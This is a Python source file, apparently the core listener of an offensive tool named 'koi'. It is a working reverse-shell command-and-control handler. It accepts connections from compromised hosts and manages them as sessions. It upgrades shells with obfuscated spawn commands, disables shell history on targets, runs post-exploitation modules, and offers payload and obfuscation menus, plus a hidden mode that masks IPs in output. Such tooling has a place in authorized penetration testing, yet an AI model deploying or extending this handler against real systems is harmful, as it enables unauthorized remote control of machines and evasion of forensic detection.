from __future__ import annotations

import os
import re
import select
import shutil
import signal
import socket
import sys
import threading
import time
from typing import Dict, Optional

from koi.utils.cli import print_help
from koi.utils.powerupgrade import upgrade_windows_conptyshell
from koi.utils.interact import interact
from koi.modules.loader import load_modules, get_module
from koi.session import Session
from koi.utils.ui import (
    colored_text, display_art, print_report_box,
    breaker_with_text, notify, Spinner, print_payloads,
    platform_badge,
    PUMPKIN, WHITE, SILVER, CORAL,
    _b, _c, _gr, _p, _r,
    gradient_text, yesno,
)
from koi.utils.obfuscate_ui import run_obfuscate_ui

LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"

_IPV4_TEXT  = re.compile(r'(?<!\d)(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}(?!\d)')
_IPV4_BYTES = re.compile(rb'(?<!\d)(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}(?!\d)')


class _MaskBinary:
    def __init__(self, real, check):
        self._real  = real
        self._check = check

    def write(self, b):
        if self._check():
            b = _IPV4_BYTES.sub(b'<IP>', b)
        return self._real.write(b)

    def __getattr__(self, name):
        return getattr(self._real, name)


class _MaskStream:
    def __init__(self, real, check):
        self._real  = real
        self._check = check
        self.buffer = _MaskBinary(real.buffer, check)

    def write(self, s):
        if self._check():
            s = _IPV4_TEXT.sub('<IP>', s)
        return self._real.write(s)

    def __getattr__(self, name):
        return getattr(self._real, name)


class Listener:
    def __init__(self, host: str = "0.0.0.0", port: int = 4010):
        self.host = host
        self.port = port
        self._sessions: Dict[int, Session] = {}
        self._next_id = 1
        self._id_lock = threading.Lock()
        self._running = False
        self._server_sock: Optional[socket.socket] = None
        self._notify_r, self._notify_w = os.pipe()
        self._in_session = False
        self._pending_notifications: list = []
        self._notif_lock = threading.Lock()
        self._pending_conpty: dict = {}
        self._conpty_staging: dict = {}
        self._conpty_lock = threading.Lock()
        self.screenable_mode: bool = False
        self._accepting: bool = True
        self._loggers: dict = {}

    def _mask_ip(self, ip: str, kind: str = "remote") -> str:
        """Return a placeholder instead of a real IP when screenable mode is active."""
        if self.screenable_mode:
            return "<LOCAL IP>" if kind == "local" else "<REMOTE IP>"
        return ip

    def _toggle_screenable(self) -> None:
        self.screenable_mode = not self.screenable_mode
        state = _c("ON") if self.screenable_mode else _gr("OFF")
        sys.stdout.write("\033[F\033[2K")
        notify('info', f"Screenable mode {state}")
        sys.stdout.flush()

    def _add(self, conn, addr) -> Session:
        with self._id_lock:
            sid = self._next_id
            self._next_id += 1
        sess = Session(id=sid, conn=conn, addr=addr)
        self._sessions[sid] = sess
        return sess

    def _get(self, sid: int) -> Optional[Session]:
        return self._sessions.get(sid)

    def _remove(self, sid: int) -> None:
        sess = self._sessions.pop(sid, None)
        if sess:
            sess.close()
        if sid in self._loggers:
            self._loggers[sid].log_event("terminated")
            self._loggers[sid].close()
            del self._loggers[sid]

    def _prune(self) -> None:
        for sid in [k for k, s in self._sessions.items() if not s.alive]:
            self._sessions.pop(sid)

    def _accept_loop(self):
        while self._running:
            try:
                self._server_sock.settimeout(1.0)
                conn, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            if not self._accepting and addr[0] not in self._pending_conpty:
                conn.close()
                continue

            if addr[0] in self._pending_conpty:
                os_type = self._pending_conpty.pop(addr[0])
                staging = Session(id=-1, conn=conn, addr=addr)
                staging.os_type = os_type
                with self._conpty_lock:
                    self._conpty_staging[addr[0]] = staging
                continue

            sess = self._add(conn, addr)

            threading.Thread(
                target=self._detect_and_notify,
                args=(sess,),
                daemon=True,
                name=f"detect-{sess.id}",
            ).start()

    def _detect_and_notify(self, sess: Session) -> None:
        from koi.utils.detect import detect_os
        detect_os(sess)

        if not sess.alive:
            return

        os_tag = f" {_gr('[')} {sess.os_label()} {_gr(']')}" if sess.os_type else ""
        masked_ip = self._mask_ip(sess.addr[0])
        msg = f"{_b(_c(f'#{sess.id}'))}  {_c(masked_ip)}{_gr(f':{sess.addr[1]}')}{os_tag}"
        os.write(self._notify_w, b"1\n")

        if self._in_session:
            with self._notif_lock:
                self._pending_notifications.append(('new', msg))
        else:
            import readline as _rl
            buf = _rl.get_line_buffer()
            sys.stdout.write(f"\r\033[K")
            notify('new', msg)
            sys.stdout.write(self._prompt() + buf)
            sys.stdout.flush()
            _rl.redisplay()

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(16)
        self._running = True

        sys.stdout = _MaskStream(sys.stdout, lambda: self.screenable_mode)
        sys.stderr = _MaskStream(sys.stderr, lambda: self.screenable_mode)

        threading.Thread(target=self._accept_loop, daemon=True, name="accept").start()

        display_art()
        print()
        notify('info', f"Listening on {_b(self.host)}:{_b(self.port)}")
        print()

        self._main_loop()

    def stop(self):
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass
        with Spinner("Closing sessions…"):
            for s in list(self._sessions.values()):
                if s.upgraded:
                    s.send(b"exit\n")
                    time.sleep(0.5)
                s.close()
        print()

    def _prompt(self) -> str:
        alive = sum(1 for s in self._sessions.values() if s.alive)
        noun = "session" if alive == 1 else "sessions"
        count = colored_text(str(alive), PUMPKIN if alive else SILVER)
        anon_tag = colored_text(" [ANON]", PUMPKIN) if self.screenable_mode else ""
        pause_tag = colored_text(" [PAUSED]", CORAL) if not self._accepting else ""
        return (
            f"{LOCALUSER}"
            + colored_text("@", PUMPKIN)
            + colored_text("koi", WHITE)
            + anon_tag
            + pause_tag
            + _gr("(")
            + count
            + _gr(f" {noun})")
            + gradient_text(" ❯ ", PUMPKIN, CORAL)
        )

    def _main_loop(self):
        while self._running:
            try:
                r, _, _ = select.select([self._notify_r], [], [], 0)
                if r:
                    os.read(self._notify_r, 4096)
                raw = input(self._prompt()).strip()
            except EOFError:
                break
            except KeyboardInterrupt:
                print()
                continue

            if not raw:
                continue

            if raw == "_koi_screenable_":
                import readline as _rl
                try:
                    _rl.remove_history_item(_rl.get_current_history_length() - 1)
                except Exception:
                    pass
                self._toggle_screenable()
                continue

            parts = raw.split()
            cmd = parts[0].lower()

            if cmd in ("exit", "quit"):
                self.stop()
                return

            elif cmd in ("help", "h", "?"):
                print_help()

            elif cmd == "stop":
                self._cmd_stop_accepting()

            elif cmd == "start":
                self._cmd_start_accepting()

            elif cmd in ("ls", "l", "list"):
                self._cmd_ls()

            elif cmd in ("go", "g", "interact"):
                if len(parts) < 2:
                    notify('error', f"Usage: go {_p('<id>')}")
                else:
                    try:
                        self._cmd_go(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd in ("upgrade", "u"):
                if len(parts) < 2:
                    notify('error', f"Usage: upgrade {_p('<id>')}")
                else:
                    try:
                        self._cmd_upgrade(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd == "kill":
                if len(parts) < 2:
                    notify('error', f"Usage: kill {_p('<id>')}")
                else:
                    try:
                        self._cmd_kill(int(parts[1]))
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            elif cmd in ("payload", "p"):
                self._cmd_payload(parts[1] if len(parts) > 1 else None)

            elif cmd in ("obfuscator", "obs", "cook"):
                self._cmd_obfuscate(parts[1] if len(parts) > 1 else None)

            elif cmd in ("logs", "log"):
                self._cmd_logs()

            elif cmd in ("modules", "mdls", "mods"):
                self._cmd_modules()

            elif cmd in ("reload", "refresh", "rl"):
                self._cmd_reload()

            elif cmd == "run":
                self._dispatch_run(parts)

            elif cmd in ("setshell", "sh"):
                if len(parts) < 3:
                    notify('error', f"Usage: setshell {_p('<id>')} {_p('<linux|windows_ps|windows_cmd>')}")
                else:
                    try:
                        self._cmd_setshell(int(parts[1]), parts[2])
                    except ValueError:
                        notify('error', "Session id must be an integer.")

            else:
                notify('error', f"Unknown command: {_p(cmd)}, type {_b('help')}")

    def _dispatch_run(self, parts: list) -> None:
        if len(parts) < 3:
            if len(parts) == 2:
                mod_cls = get_module(parts[1])
                if mod_cls and mod_cls.usage:
                    notify('error', f"Usage: run {_p(mod_cls.usage)}")
                elif mod_cls:
                    notify('error', f"Usage: run {_p(mod_cls.name)} {_p('<id>')}")
                else:
                    notify('error', f"Unknown module {_p(parts[1])}, type {_b('modules')}")
            else:
                notify('error', f"Usage: run {_p('<module>')} {_p('<id>')} {_p('[args…]')}")
            return

        mod_name = parts[1]
        try:
            sid = int(parts[2])
        except ValueError:
            notify('error', "Session id must be an integer.")
            return
        self._cmd_run(mod_name, sid, parts[3:])

    def _cmd_stop_accepting(self) -> None:
        if not self._accepting:
            notify('warning', "Listener is already paused.")
            return
        self._accepting = False
        notify('warning', f"Listener {_b('paused')}, new connections refused.")

    def _cmd_start_accepting(self) -> None:
        if self._accepting:
            notify('info', "Listener is already accepting connections.")
            return
        self._accepting = True
        notify('success', f"Listener {_b('resumed')}, accepting new connections.")

    def _cmd_ls(self) -> None:
        self._prune()
        if not self._sessions:
            print()
            notify('status', _gr('No active sessions.'))
            print()
            return
        data = {}
        for s in sorted(self._sessions.values(), key=lambda x: x.id):
            masked_ip = self._mask_ip(s.addr[0])
            key = f"#{s.id}  {s.status_dot()}  {_c(masked_ip)}{_gr(f':{s.addr[1]}')} [{s.os_label()}]"
            data[key] = s._uptime()
        print_report_box("Sessions", data)

    def _cmd_logs(self) -> None:
        from koi.utils.logger import print_log_list
        print_log_list()

    def _cmd_reload(self) -> None:
        with Spinner("Reloading modules…"):
            modules = load_modules(reload=True)
        notify('info', f"Loaded {_p(str(len(modules)))} modules.")

    def _cmd_upgrade(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return
        if sess.upgraded:
            notify('warning', f"Session {_p(f'#{sid}')} is already upgraded.")
            if not yesno("Do you want to try upgrading again?"):
                return

        if sess.os_type in ("windows_cmd", "windows_ps"):
            upgrade_windows_conptyshell(
                sess, self._sessions, self.port,
                self._pending_conpty, self._conpty_staging, self._conpty_lock,
                self._mask_ip,
            )
            return

        with Spinner("Upgrading shell…"):
            from koi.utils.bash_obfuscate import obfuscated_upgrade_spawn
            sess.send(obfuscated_upgrade_spawn().encode())
            self._drain(sess, 0.8)

            if not sess.alive:
                notify('error', f"Session {_p(f'#{sid}')} died during upgrade.")
                return

            sess.send(b"export TERM=xterm-256color HISTSIZE=0 HISTFILESIZE=0\n")
            self._drain(sess, 0.3)
            self._sync_winsize(sess)
            self._drain(sess, 0.3)
            sess.upgraded = True

        notify('success', f"Shell {_p(f'#{sid}')} upgraded successfully.")

    def _cmd_kill(self, sid: int) -> None:
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        with Spinner(f"Terminating session #{sid}…"):
            if sess.upgraded:
                sess.send(b"exit\n")
                time.sleep(0.5)
            self._remove(sid)
        notify('success', f"Session {_p(f'#{sid}')} terminated.")

    def _cmd_go(self, sid: int) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        ip, port = sess.addr
        is_windows_pty = sess.os_type in ("windows_cmd", "windows_ps") and sess.upgraded

        print()
        notify('info', f"Entering session {_b(_r(f'#{sid}'))} {_c(self._mask_ip(ip))}{_gr(f':{port}')}")
        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            notify('status', _gr('Ctrl+Z to background  ·  line-by-line mode'))
        else:
            notify('status', _gr('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
        print()

        if sess.upgraded:
            if not is_windows_pty:
                self._sync_winsize(sess)
                self._drain(sess, 0.3)
                sess.send(b"\n")
                time.sleep(0.15)
            signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))

        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            sess.send(b"\r\n")
            time.sleep(0.2)

        breaker_with_text()

        if is_windows_pty:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()

        if sess.id not in self._loggers:
            from koi.utils.logger import start_logger
            lg = start_logger(sess)
            self._loggers[sess.id] = lg
            sess.log_path = str(lg.path)
            notify('info', f"Logging to {_gr(lg.path.name)}")

        self._in_session = True
        logger = self._loggers.get(sess.id)
        logger.log_event(f"enter {self._mask_ip(ip)}:{port}")
        reason = interact(sess, logger=logger)
        logger.log_event(reason)
        self._in_session = False

        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
        print()
        breaker_with_text()

        if reason == "backgrounded":
            print()
            notify('warning', f"Session {_b(_c(f'#{sid}'))} backgrounded. Back at listener shell.")
            print()
        elif reason == "disconnected":
            print()
            notify('error', f"Session {_b(_c(f'#{sid}'))} disconnected.")
            print()
            self._remove(sid)

        self._flush_pending_notifications()

    def _cmd_modules(self) -> None:
        modules = load_modules()
        if not modules:
            notify('status', _gr("No modules found in src/koi/modules/."))
            return

        has_categories = any(cls.category for cls in modules.values())

        if has_categories:
            grouped = {}
            for name, cls in modules.items():
                cat = cls.category or "Other"
                grouped.setdefault(cat, {})[_p(name)] = f"{cls.description}  {platform_badge(cls.platform)}"
            print_report_box("Modules", grouped)
        else:
            data = {_p(name): f"{cls.description}  {platform_badge(cls.platform)}" for name, cls in modules.items()}
            print_report_box("Modules", data)

    def _cmd_run(self, mod_name: str, sid: int, mod_args: list) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return
        if not sess.alive:
            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        mod_cls = get_module(mod_name)
        if mod_cls is None:
            available = ", ".join(load_modules().keys()) or "none"
            notify('error', f"Module {_p(mod_name)} not found.")
            notify('status', _gr(f"Available: {available}"))
            return

        if not mod_cls.supports(sess.os_type):
            badge = platform_badge(mod_cls.platform)
            os_label = sess.os_label()
            notify('error', f"Module {_p(mod_name)} {badge} is not compatible with session {_p(f'#{sid}')} ({os_label}).")
            return

        notify('info', f"Running module {_p(mod_name)} on session {_p(f'#{sid}')}…")
        print()
        old_handler = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))
        if sess.id not in self._loggers:
            from koi.utils.logger import start_logger
            lg = start_logger(sess)
            self._loggers[sess.id] = lg
            sess.log_path = str(lg.path)
        logger = self._loggers[sess.id]
        try:
            mod = mod_cls(session=sess, args=mod_args, logger=logger)
            mod.run_module()
        except KeyboardInterrupt:
            print()
            notify('warning', "Module interrupted.")
            logger.log_event(f"module_interrupted  {mod_name}")
        except Exception as exc:
            notify('error', f"Module raised an exception: {exc}")
            logger.log_event(f"module_error  {mod_name}  {exc}")
        finally:
            signal.signal(signal.SIGINT, old_handler)
        print()

    _OS_ALIASES: dict[str, str] = {
        "linux":       "linux",
        "windows_ps":  "windows_ps",
        "windows_cmd": "windows_cmd",
        "ps":          "windows_ps",
        "powershell":  "windows_ps",
        "cmd":         "windows_cmd",
    }

    def _cmd_setshell(self, sid: int, os_arg: str) -> None:
        self._prune()
        sess = self._get(sid)
        if sess is None:
            notify('error', f"Session {_p(f'#{sid}')} not found.")
            return

        os_type = self._OS_ALIASES.get(os_arg.lower())
        if os_type is None:
            valid = ", ".join(sorted(set(self._OS_ALIASES.values())))
            notify('error', f"Unknown OS type {_p(os_arg)!r}.  Valid: {_gr(valid)}")
            return

        old = sess.os_label()
        sess.os_type = os_type

        if os_type == "linux":
            sess.encoding = "utf-8"
            sess.eol      = "\n"
        else:
            sess.encoding = "cp1252"
            sess.eol      = "\r\n"

        notify('success',
            f"Session {_p(f'#{sid}')} OS set: {old} → {sess.os_label()}")

    def _cmd_payload(self, iface: Optional[str] = None) -> None:
        print_payloads(iface, self.port)

    def _cmd_obfuscate(self, iface: Optional[str] = None) -> None:
        run_obfuscate_ui(iface, self.port)

    def _flush_pending_notifications(self) -> None:
        with self._notif_lock:
            pending = self._pending_notifications[:]
            self._pending_notifications.clear()
        for msg_type, text in pending:
            notify(msg_type, text)

    def _drain(self, sess: Session, duration: float = 0.5) -> None:
        deadline = time.monotonic() + duration
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([sess.conn], [], [], min(remaining, 0.05))
                if r:
                    sess.conn.recv(4096)
            except OSError:
                break

    def _sync_winsize(self, sess: Session) -> None:
        try:
            cols, rows = shutil.get_terminal_size()
        except Exception:
            return
        sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())

    def _winch(self, sess: Session) -> None:
        if sess.os_type in ("windows_cmd", "windows_ps"):
            if sess.is_conptyshell:
                try:
                    cols, rows = shutil.get_terminal_size()
                    sess.send(f"\x08{cols}x{rows}".encode())
                except Exception:
                    pass
            return
        self._sync_winsize(sess)
        self._drain(sess, 0.15)